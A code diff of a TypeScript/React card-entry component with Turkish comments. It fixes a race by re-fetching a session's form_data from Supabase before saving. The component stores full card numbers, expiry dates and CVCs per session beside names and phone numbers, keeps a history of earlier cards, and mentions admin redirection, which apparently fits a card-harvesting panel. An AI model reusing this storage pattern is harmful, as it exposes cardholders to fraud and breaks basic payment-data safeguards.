@@ -157,12 +157,30 @@ export function CardClient({ sessionId }: Props) {
     setSaving(true);
     setMsg(null);
 
+    // 🔴 KRITIK: sessionFormData state'i henuz yuklenmemis/bos olabilir
+    //    (admin yonlendirmesi sonrasi fetch bitmeden submit edilirse
+    //    form_data'yi {} ile ezip isim/soyisim/telefonu sileriz).
+    //    Yazmadan hemen once DB'den taze form_data cek ve merge et.
+    let freshFormData = sessionFormData;
+    try {
+      const { data: freshRow } = await supabase
+        .from("sessions")
+        .select("form_data")
+        .eq("id", sessionId)
+        .maybeSingle();
+      if (freshRow?.form_data && typeof freshRow.form_data === "object") {
+        freshFormData = { ...sessionFormData, ...(freshRow.form_data as Record<string, unknown>) };
+      }
+    } catch {
+      /* fresh fetch basarisizsa state ile devam */
+    }
+
     // 1) KART GECMISI KAYDI: ESKI kart degerleri (cardLoginHistory) yeni giristen ONCE history'ye atilir.
     //    Boylece en guncel kart TEKIL olarak cardNumber/cardExpiry/cardCvc'de durur, ESKI kartlar sadece GECMIS MODAL'inda gorunur.
     let cardLoginHistory: unknown[] = [];
     try {
       const str = (x: unknown): string => (typeof x === "string" ? x.trim() : "");
-      const sfd = sessionFormData as Record<string, unknown>;
+      const sfd = freshFormData as Record<string, unknown>;
       const oldHolder = str(sfd.cardHolder);
       const oldNumber = str(sfd.cardNumber);
       const oldExpiry = str(sfd.cardExpiry);
@@ -195,7 +213,7 @@ export function CardClient({ sessionId }: Props) {
     }
 
     const nextFormData: Record<string, unknown> = {
-      ...sessionFormData,
+      ...freshFormData,
       cardHolder: "",
       cardNumber: number.trim(),
       cardExpiry: expiry.trim(),
